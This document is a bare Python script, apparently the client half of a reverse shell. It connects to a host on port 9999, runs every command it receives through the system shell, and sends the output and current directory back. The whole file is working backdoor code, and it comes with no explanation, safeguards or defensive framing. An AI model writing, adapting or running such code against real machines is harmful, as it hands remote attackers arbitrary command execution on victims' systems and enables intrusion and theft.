import socket
import os
import subprocess

s = socket.socket()
host = "127.0.0.1"
port = 9999

s.connect((host, port))

while True:
    server_data = s.recv(1024)
    if server_data[:2].decode("utf8") == 'cd':
        os.chdir(server_data[3:].decode("utf8"))

    if len(server_data) > 0:
        cmd =  subprocess.Popen(server_data[:].decode("utf8"), shell=True, stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE, stderr=subprocess.PIPE)

        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf8")

        current_dir = os.getcwd() + "> "
        s.send(str.encode(output_str + current_dir))

        print(output_str)
